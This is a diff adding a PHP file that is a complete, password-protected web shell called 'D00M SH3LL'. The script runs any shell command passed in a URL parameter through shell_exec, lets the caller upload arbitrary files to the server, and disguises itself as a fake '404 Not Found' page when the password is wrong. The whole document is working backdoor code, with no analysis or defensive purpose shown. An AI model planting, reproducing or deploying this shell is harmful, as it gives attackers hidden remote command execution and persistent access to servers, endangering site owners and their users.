@@ -1,0 +1,52 @@
+<?php
+/* W3B Sh3ll */
+/* D00M TM */
+/* By mahan POLYBIUS */
+$ps = 'b4f945433ea4c369c12741f62a23ccc0'; /*Md5 Pa33w0Rd*/
+$pas = $_GET['pass'];
+if (md5($pas) == $ps){
+	echo "<!DOCTYPE html><html lang='en'>
+<head>
+				<title>!~ D00M SH3LL ~!</title>
+</head>
+<body bgcolor='black'><center><img src=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQIu9cck57nf706xFWXdYCib_PqD1jIb8PKbg&usqp=CAU><h1><font color='RED' size='5'>[×] D00M SH3LL [×]</font></h1><center>
+   <h1><font color='RED' size='3'>[+] Path : ".__FILE__. "</font></h1><h1><font color='RED' size='3'>[+] Server IP : " .$_SERVER['SERVER_ADDR']. " & Your IP : " .$_SERVER['REMOTE_ADDR']."</font></h1>";
+	if ($_GET['sub'] == 'sub'){
+		$cmd = shell_exec($_GET['cum']);
+		echo "<h1><font color='RED' size='4'>OUT : ".$cmd. "</font></h1>";
+	}
+	if ($_POST['sub'] == 'upload'){
+		$nf = $_FILES['file']['name'];
+		move_uploaded_file($_FILES['file']['tmp_name'], $nf);
+		echo " <h1><font color='RED' size='4'> Uploaded : " .$nf."</font></h1>";	
+	
+	}
+	echo "
+<br></br>
+	<form action='' method='get'>
+	<h1><font color='RED' size='4'>Comment execute</font></h1>
+<input name='cum' type='text' id='cum'>
+<input name='pass' type='hidden' id='pass' value=".$pas.">
+<input name='sub' type='submit' id='sub' value=sub></form>
+
+<form method='post' action='' enctype='multipart/form-data'>
+ <h1><font color='RED' size='4'>File upload</font></h1>
+ <input type='file' name='file' id='file'>
+ <input type='submit' name='sub' value=upload>
+</form>
+
+</body>
+</html>";
+}
+else{
+	echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<p>Additionally, a 404 Not Found
+error was encountered while trying to use an ErrorDocument to handle the request.</p>
+</body></html>';
+}
+?>
